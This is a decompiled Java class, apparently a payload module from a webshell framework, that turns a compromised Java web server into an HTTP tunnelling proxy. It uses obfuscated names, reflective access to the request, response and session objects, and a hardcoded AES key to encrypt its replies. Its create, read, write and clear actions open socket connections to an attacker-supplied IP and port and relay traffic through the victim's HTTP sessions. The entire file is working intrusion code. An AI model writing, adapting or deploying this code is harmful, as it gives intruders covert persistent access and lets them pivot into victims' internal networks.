/*
 * Decompiled with CFR 0.152.
 */
package net.voyec.qckhl;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Vejbm {
    public static String action;
    public static String targetIP;
    public static String targetPort;
    public static String socketHash;
    public static String extraData;
    private Object Request;
    private Object Response;
    private Object Session;

    public Vejbm() {
        action = "";
        action = action + "read";
        socketHash = "";
        socketHash = socketHash + "1d57f2bc4a4ee11b";
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Loose catch block
     */
    public boolean equals(Object obj) {
        block15: {
            HashMap<String, String> result;
            block14: {
                result = new HashMap<String, String>();
                this.fillContext(obj);
                String proxySessionKey = "socks_" + socketHash;
                if (action.equals("create")) {
                    this.createTunnel(proxySessionKey);
                    result.put("msg", "HTTP\u96a7\u9053\u5f00\u542f\u6210\u529f");
                    result.put("status", "success");
                    break block14;
                }
                if (action.equals("read")) {
                    byte[] data = this.doRead(proxySessionKey);
                    result.put("status", "success");
                    result.put("msg", Vejbm.base64encode(data));
                    break block14;
                }
                if (action.equals("write")) {
                    this.doWrite(proxySessionKey);
                    result.put("status", "success");
                    result.put("msg", "ok");
                    break block14;
                }
                if (action.equals("close")) {
                    SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
                    socketChannel.socket().close();
                    break block14;
                }
                if (!action.equals("clear")) break block14;
                this.doClear();
                result.put("status", "success");
                result.put("msg", "ok");
            }
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            }
            catch (Exception so) {}
            break block15;
            catch (Exception e) {
                try {
                    e.printStackTrace();
                    result.put("status", "fail");
                    result.put("msg", e.getMessage());
                }
                catch (Throwable throwable) {
                    try {
                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        Method write = so.getClass().getMethod("write", byte[].class);
                        write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    throw throwable;
                }
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write = so.getClass().getMethod("write", byte[].class);
                    write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                }
                catch (Exception exception) {}
            }
        }
        return true;
    }

    private void createTunnel(String proxySessionKey) throws Exception {
        String target = targetIP;
        int port = Integer.parseInt(targetPort);
        SocketChannel socketChannel = SocketChannel.open();
        socketChannel.connect(new InetSocketAddress(target, port));
        socketChannel.configureBlocking(false);
        this.sessionSetAttribute(this.Session, proxySessionKey, socketChannel);
    }

    private byte[] doRead(String proxySessionKey) throws Exception {
        SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
        if (socketChannel == null) {
            this.createTunnel(proxySessionKey);
        }
        if (socketChannel.socket().isClosed()) {
            socketChannel.close();
            this.sessionRemoveAttribute(this.Session, proxySessionKey);
            throw new Exception("socketChanel closed");
        }
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ByteBuffer buf = ByteBuffer.allocate(512);
        int length = socketChannel.read(buf);
        while (length > 0) {
            byte[] data = Arrays.copyOfRange(buf.array(), 0, length);
            buf.clear();
            bos.write(data);
            length = socketChannel.read(buf);
        }
        if (length == -1) {
            socketChannel.close();
            throw new Exception("socketChanel closed");
        }
        return bos.toByteArray();
    }

    private void doWrite(String proxySessionKey) throws Exception {
        SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
        byte[] extraDataByte = this.base64decode(extraData);
        ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
        buf.clear();
        buf.put(extraDataByte);
        buf.flip();
        while (buf.hasRemaining()) {
            socketChannel.write(buf);
        }
        buf.clear();
    }

    private void doClear() {
        Enumeration keys = this.sessionGetAttributeNames(this.Session);
        while (keys.hasMoreElements()) {
            String proxySessionKey = keys.nextElement().toString();
            if (!proxySessionKey.startsWith("socks_")) continue;
            SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
            try {
                socketChannel.close();
            }
            catch (Exception exception) {
                // empty catch block
            }
            this.sessionRemoveAttribute(this.Session, proxySessionKey);
        }
    }

    private byte[] base64decode(String text) throws Exception {
        String version = System.getProperty("java.version");
        byte[] result = null;
        try {
            if (version.compareTo("1.9") >= 0) {
                this.getClass();
                Class<?> Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
                result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
            } else {
                this.getClass();
                Class<?> Base64 = Class.forName("sun.misc.BASE64Decoder");
                Object Decoder = Base64.newInstance();
                result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return result;
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private Object sessionGetAttribute(Object session, String key) {
        Object result = null;
        try {
            result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return result;
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private Enumeration sessionGetAttributeNames(Object session) {
        Enumeration result = null;
        try {
            result = (Enumeration)session.getClass().getMethod("getAttributeNames", new Class[0]).invoke(session, new Object[0]);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return result;
    }

    private void sessionRemoveAttribute(Object session, String key) {
        try {
            session.getClass().getMethod("removeAttribute", String.class).invoke(session, key);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                Object Encoder;
                Class<?> Base64;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    private static String base64encode(byte[] content) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{content});
        } else {
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{content});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "bc2172db605712b9";
        byte[] byArray2 = string.getBytes("utf-8");
        SecretKeySpec secretKeySpec = new SecretKeySpec(byArray2, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] byArray3 = cipher.doFinal(byArray);
        try {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object object = clazz.getMethod("getEncoder", null).invoke(clazz, null);
            byArray3 = (byte[])object.getClass().getMethod("encode", byte[].class).invoke(object, new Object[]{byArray3});
        }
        catch (Throwable throwable) {
            Class<?> clazz = Class.forName("sun.misc.BASE64Encoder");
            Object obj = clazz.newInstance();
            String string2 = (String)obj.getClass().getMethod("encode", byte[].class).invoke(obj, new Object[]{byArray3});
            string2 = string2.replace("\n", "").replace("\r", "");
            byArray3 = string2.getBytes();
        }
        return byArray3;
    }
}
